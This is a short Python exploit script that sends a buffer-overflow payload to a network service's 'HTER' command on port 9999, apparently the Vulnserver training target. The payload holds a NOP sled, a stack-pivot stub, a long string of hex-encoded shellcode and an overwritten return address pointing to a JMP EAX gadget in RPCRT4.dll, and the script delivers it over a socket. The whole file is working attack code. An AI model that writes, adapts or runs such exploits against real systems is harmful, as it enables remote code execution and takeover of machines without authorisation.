import socket
import os
import sys

host = '192.168.102.148'
port = 9999

# Found JMP EAX at 0x77366253 within RPCRT4.dll, which is all hex

junk = '0'
junk += '90' * 10
junk += '505C' # PUSH EAX, POP ESP
junk += '90' * 8
junk += '90' * (100-20)

shell = 'dbd4beb7a416a1d97424f45833c9b1523170170370178377a0f4548b417a9673921b1e96a31b44d394ab0eb118474221aa254b461b83ad699cb88ee81ec3c2ca1f0c170b6771da5930fd494d354b52e6055dd21bdd5cf38a5507d32db9335a35de7e14ce14f4a70665f50467490454a06ef723d88c8a331fee50b1bb4812616768f7f4ec66bc73aa6a4357c197c856051e8a7c817a481c90263f21c288e0878925f4b5d02139f4eab1558f9983fa3b35a873e2c2cfa9525c2e52a375f506f3eddc2698ede1f20fbd4dadef6d2e1d9867a142b8886beb5373fcd40c1de1bc4ee11886c60770e88e90ed918a6a8f5e01178fd5a6e85e1ec2fa37ee99a09ef137cc7d63dc0c0b984b5b5c6e820970c93c2f898f07eb566c89f21bc8ade4e5d1e950ba87a70e7c7e06f8d62dc06cae1dd3eaaf4ba5120122f02daea2f456d252fa8d566c0a1f43f9b5ca2e6746216c9ec5c30d65d5a60821515b613a345bd63b1d'

junk += shell
junk += '90' * ((2040/2) - 100 - (len(shell)/2))

#junk += '\x42' * 8 # EIP
junk += '\x35\x33\x36\x32\x33\x36\x37\x37'
junk += '\x43' * 8 # ESP
junk += '\x41' * (2500 - len(junk))

sploit = 'HTER ' + junk

expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect((host, port))
expl.recv(1024)
expl.send(sploit)
expl.close()
